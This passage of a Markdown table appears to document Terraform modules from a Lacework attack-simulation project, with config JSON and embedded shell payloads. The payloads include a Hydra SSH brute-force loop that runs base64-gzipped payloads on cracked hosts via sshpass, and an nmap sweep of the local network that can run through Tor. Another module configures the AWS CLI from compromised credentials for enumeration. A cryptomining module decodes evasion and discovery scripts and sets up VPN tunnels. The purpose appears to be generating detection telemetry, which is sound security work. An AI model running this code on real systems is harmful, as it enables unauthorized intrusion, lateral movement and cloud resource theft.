\-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true&quot;<br/>        sudo /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        EOF<br/>        : &lt;&lt;\-EOF<br/>        log &quot;Running: hydra \-V \-L $\{var\.inputs\[&quot;user\_list&quot;\]\} \-P $\{var\.inputs\[&quot;password\_list&quot;\]\} \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh&quot;<br/>        sudo /bin/bash \-c &quot;docker run \-v /tmp:/tmp \-\-entrypoint=hydra \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} \-V \-L $\{var\.inputs\[&quot;user\_list&quot;\]\} \-P $\{var\.inputs\[&quot;password\_list&quot;\]\} \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true&quot;<br/>        sudo /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        log &quot;Running: hydra \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh&quot;<br/>        sudo /bin/bash \-c &quot;docker run \-v /tmp:/tmp \-\-entrypoint=hydra \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true&quot;<br/>        sudo /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        EOF<br/>        \}<br/>        \# Read Hydra output file line by line<br/>        while IFS= read \-r line; do<br/>            \# Parse Hydra output<br/>            host=$\(echo &quot;$line&quot; \| awk &\#x27;\{print $3\}&\#x27;\)<br/>            username=$\(echo &quot;$line&quot; \| awk &\#x27;\{print $5\}&\#x27;\)<br/>            password=$\(echo &quot;$line&quot; \| awk &\#x27;\{print $7\}&\#x27;\)<br/>            log &quot;Attempting to execute payload: sshpass \-p \\&quot;$password\\&quot; ssh \-o StrictHostKeyChecking=no \\&quot;$username\\&quot;@\\&quot;$host\\&quot; &\#x27;echo $\{base64gzip\(local\.base64\_command\_payload\)\} \| base64 \-d \| gunzip \| /bin/bash&quot;<br/>            sshpass \-p &quot;$password&quot; ssh \-o StrictHostKeyChecking=no &quot;$username&quot;@&quot;$host&quot; &\#x27;echo $\{base64gzip\(local\.base64\_command\_payload\)\} \| base64 \-d \| gunzip \| /bin/bash&\#x27;<br/>            log &quot;Done&quot;<br/>        done &lt; &lt;\(grep \-v &quot;^\#&quot; /tmp/hydra\-found\.txt \| sort \| uniq\)<br/>        log &quot;Done\.&quot;<br/><br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>            log &quot;waiting $\{var\.inputs\[&quot;attack\_delay&quot;\]\} seconds\.\.\.&quot;;<br/>            sleep $\{var\.inputs\[&quot;attack\_delay&quot;\]\}<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;sshpass jq&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;sshpass jq&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = var\.inputs\[&quot;attack\_delay&quot;\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| target-ssm-execute-docker-nmap                                             | ./modules/ssm/execute-docker-nmap                              | ssm_exec_docker_nmap_target                | context.aws.ssm.target.execute.docker_nmap                                | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "docker_nmap": {<br/>                            "attack_delay": 50400,<br/>                            "enabled": false,<br/>                            "ports": [<br/>                                22,<br/>                                80,<br/>                                443,<br/>                                1433,<br/>                                3306,<br/>                                5000,<br/>                                5432,<br/>                                5900,<br/>                                6379,<br/>                                8000,<br/>                                8080,<br/>                                8088,<br/>                                8090,<br/>                                8091,<br/>                                9200,<br/>                                27017<br/>                            ],<br/>                            "scan_local_network": true,<br/>                            "targets": [],<br/>                            "use_tor": false<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-nmap                              | <pre>locals \{<br/>    attack\_dir = &quot;/nmap&quot;<br/>    attack\_script = &quot;nmap\.sh&quot;<br/>    start\_script = &quot;delayed\_start\.sh&quot;<br/>    lock\_file = &quot;/tmp/delay\_nmap\.lock&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting script\.\.\.&quot;<br/>        LOCAL\_NET=$\(ip \-o \-f inet addr show \| awk &\#x27;/scope global/ \{print $4\}&\#x27; \| head \-1\)<br/>        log &quot;LOCAL\_NET: $LOCAL\_NET&quot;<br/>        log &quot;Targets: $\{join\(&quot;,&quot;, var\.inputs\[&quot;targets&quot;\]\)\}&quot;<br/>        echo &quot;$\{ length\(var\.inputs\[&quot;targets&quot;\]\) &gt; 0 ? join\(&quot;\\n&quot;, var\.inputs\[&quot;targets&quot;\]\) : &quot;$LOCAL\_NET&quot; \}&quot; &gt; /tmp/nmap\-targets\.txt<br/>        log &quot;Ports: $\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\}&quot;<br/>        if docker ps \-a \| grep $\{var\.inputs\[&quot;container\_name&quot;\]\}; then <br/>            docker stop $\{var\.inputs\[&quot;container\_name&quot;\]\}<br/>            docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}<br/>        fi<br/>        $\{ var\.inputs\[&quot;use\_tor&quot;\] == true ? &lt;&lt;\-EOF<br/>        log &quot;Using tor network\.\.\.&quot;<br/>        if \! docker ps \| grep torproxy &gt; /dev/null; then<br/>        docker run \-d \-\-rm \-\-name torproxy \-p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$\(docker inspect \-f &\#x27;\{\{range \.NetworkSettings\.Networks\}\}\{\{\.IPAddress\}\}\{\{end\}\}&\#x27; torproxy\)<br/>        log &quot;Running via docker: proxychains nmap \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\} \-iL /tmp/nmap\-targets\.txt&quot;<br/>        /bin/bash \-c &quot;docker run \-v /tmp:/tmp \-e TORPROXY=$TORPROXY \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} nmap \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\} \-iL /tmp/nmap\-targets\.txt \|\| true&quot; <br/>        /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        EOF<br/>        : &lt;&lt;\-EOF<br/>        log &quot;Running via docker: nmap \-Pn \-sS \-T2 \-oX /tmp/scan\.xml \-p$\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\} \-iL /tmp/nmap\-targets\.txt&quot;<br/>        /bin/bash \-c &quot;docker run \-\-rm \-v /tmp:/tmp \-\-entrypoint=nmap \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\} \-iL /tmp/nmap\-targets\.txt \|\| true&quot;<br/>        /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        EOF<br/>        \}<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>            log &quot;waiting $\{var\.inputs\[&quot;attack\_delay&quot;\]\} seconds\.\.\.&quot;;<br/>            sleep $\{var\.inputs\[&quot;attack\_delay&quot;\]\}<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = var\.inputs\[&quot;attack\_delay&quot;\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| target-ssm-execute-generate-aws-cli-traffic                                | ./modules/ssm/execute-generate-aws-cli-traffic                 | ssm_exec_generate_aws_cli_traffic_target   | context.aws.ssm.target.execute.generate_aws_cli_traffic                   | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "generate_aws_cli_traffic": {<br/>                            "commands": [<br/>                                "x=10",<br/>                                "opts=\"--output json --color off --no-cli-pager\"",<br/>                                "while [ $x -gt 0 ]; do ",<br/>                                "log \"Running: aws sts get-caller-identity $opts\"",<br/>                                "aws sts get-caller-identity $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws iam list-users $opts\"",<br/>                                "aws iam list-users $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws s3api list-buckets $opts\"",<br/>                                "aws s3api list-buckets $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-instances $opts\"",<br/>                                "aws ec2 describe-instances $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts\"",<br/>                                "aws ec2 describe-images --filters \"Name=name,Values=ubuntu-pro-server/images/*20.04*\" $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-volumes $opts\"",<br/>                                "aws ec2 describe-volumes $opts >> $LOGFILE 2>&1",<br/>                                "log \"Running: aws ec2 describe-vpcs $opts\"",<br/>                                "aws ec2 describe-vpcs $opts >> $LOGFILE 2>&1",<br/>                                "x=$(($x-1))",<br/>                                "done"<br/>                            ],<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "profile": "aws-traffic"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>   | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-aws-cli-traffic                 | <pre>locals \{<br/>    tool = &quot;aws&quot;<br/>    attack\_dir = &quot;/generate\-aws\-cli\-traffic&quot;<br/>    aws\_creds = join\(&quot;\\n&quot;, \[ for u,k in var\.inputs\[&quot;compromised\_credentials&quot;\]: &quot;echo &\#x27;$\{k\.rendered\}&\#x27; &gt; $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}&quot; \]\)<br/>    aws\_commands = join\(&quot;\\n&quot;, \[ for command in var\.inputs\[&quot;commands&quot;\]: &quot;$\{command\}&quot; \]\)<br/>    payload = &lt;&lt;\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    source \.env\-aws\-$\{var\.inputs\[&quot;compromised\_keys\_user&quot;\]\}<br/>    PROFILE=&quot;$\{var\.inputs\[&quot;profile&quot;\]\}&quot;<br/>    REGION=&quot;$\{var\.inputs\[&quot;region&quot;\]\}&quot;<br/>    aws configure set aws\_access\_key\_id $AWS\_ACCESS\_KEY\_ID \-\-profile=$PROFILE<br/>    aws configure set aws\_secret\_access\_key $AWS\_SECRET\_ACCESS\_KEY \-\-profile=$PROFILE<br/>    aws configure set region $REGION \-\-profile=$PROFILE<br/>    aws configure set output json \-\-profile=$PROFILE<br/>    log &quot;Running aws commands\.\.\.&quot;<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        $\{local\.aws\_commands\}<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &gt; /dev/null; do<br/>            log &quot;$\{local\.tool\} not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &gt; /dev/null; do<br/>            log &quot;$\{local\.tool\} not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| target-ssm-execute-generate-web-traffic-target                             | ./modules/ssm/execute-generate-web-traffic                     | ssm_exec_generate_web_traffic_target       | context.aws.ssm.target.execute.generate_web_traffic                       | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "generate_web_traffic": {<br/>                            "delay": 60,<br/>                            "enabled": false,<br/>                            "urls": []<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-web-traffic                     | <pre>locals \{<br/>    attack\_dir = &quot;/generate\-web\-traffic&quot;<br/>    curl\_urls = join\(&quot;\\n&quot;, \[ for url in var\.inputs\[&quot;urls&quot;\]: &quot;curl \-s \-\-retry 20 \-\-retry\-connrefused \-\-retry\-delay 60 \-\-connect\-timeout 5 &\#x27;$\{url\}&\#x27;; log \\&quot;curl $\{url\} result: $?\\&quot;&quot; \]\)<br/>    payload = &lt;&lt;\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    log &quot;Enumerating urls\.\.\.&quot;<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;Running url enumeration:\\n$\{local\.curl\_urls\}&quot;<br/>        $\{local\.curl\_urls\}<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| attacker-simulation-attacker-exec-docker-composite-cloud-cryptomining      | ./modules/ssm/execute-docker-composite-cloud-cryptomining      | ssm_exec_docker_cloud_cryptomining         | context.aws.ssm.attacker.execute.docker_composite_cloud_cryptomining      | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "attacker": {<br/>                    "execute": {<br/>                        "docker_composite_cloud_cryptomining": {<br/>                            "attack_delay": 50400,<br/>                            "compromised_credentials": {},<br/>                            "compromised_keys_user": null,<br/>                            "enabled": false,<br/>                            "minergate_user": null,<br/>                            "nicehash_user": null,<br/>                            "protonvpn_password": null,<br/>                            "protonvpn_privatekey": null,<br/>                            "protonvpn_protocol": "udp",<br/>                            "protonvpn_server": "RANDOM",<br/>                            "protonvpn_tier": 0,<br/>                            "protonvpn_user": null,<br/>                            "wallet": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-composite-cloud-cryptomining      | <pre>locals \{<br/>    attack\_dir = &quot;/cloud\-tunnel&quot;<br/>    script = &quot;cloudcrypto&quot;<br/>    script\_type = &quot;terraform&quot;<br/>    attack\_type = &quot;cloud\_cryptomining&quot;<br/>    aws\_creds = join\(&quot;\\n&quot;, \[ for u,k in var\.inputs\[&quot;compromised\_credentials&quot;\]: &quot;echo &\#x27;$\{k\.rendered\}&\#x27; &gt; $\{local\.attack\_dir\}/\.env\-aws\-$\{u\}&quot; \]\)<br/>    payload = &lt;&lt;\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\} $\{local\.attack\_dir\}/aws\-cli/scripts $\{local\.attack\_dir\}/terraform/scripts/cloudcrypto $\{local\.attack\_dir\}/terraform/scripts/hostcrypto $\{local\.attack\_dir\}/protonvpn<br/>    cd $\{local\.attack\_dir\}<br/>    $\{local\.aws\_creds\}<br/>    echo &\#x27;$\{base64gzip\(local\.start\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/start\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.auto\-free\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/auto\-free\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.auto\-paid\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/auto\-paid\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\-paid\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn\-paid<br/>    echo &\#x27;$\{base64gzip\(local\.protonvpn\-baseline\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/\.env\-protonvpn\-baseline<br/>    echo &\#x27;$\{base64gzip\(local\.baseline\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/baseline\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.discovery\)\}&\#x27; \| base64 \-d \| gunzip &gt; /$\{local\.attack\_dir\}/aws\-cli/scripts/discovery\.sh<br/>    echo &\#x27;$\{base64gzip\(local\.evasion\)\}&\#x27; \| base64 \-d \| gunzip 